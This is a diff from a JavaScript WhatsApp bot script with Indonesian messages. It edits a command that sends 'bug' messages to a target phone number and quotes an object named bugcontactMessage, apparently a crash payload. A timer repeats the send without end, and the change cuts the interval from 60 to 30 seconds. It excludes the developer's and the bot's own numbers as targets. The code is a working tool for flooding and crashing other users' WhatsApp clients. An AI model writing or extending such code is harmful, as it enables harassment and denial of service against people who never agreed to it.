@@ -220,12 +220,12 @@ if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim b
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 reply('Berhasil mengirim 1 bug!')
 semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
-reply('Loading 1Minutes...')
-function delay1Menit(i) { setTimeout(() => {
+reply('Loading 30Second...')
+function delay30d(i) { setTimeout(() => {
 reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
 semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
-delay1Menit(++i)}, 60000)}
-delay1Menit(0)
+delay30d(++i)}, 30000)}
+delay30d(0)
 break
 
 //©from: dennis x haikal
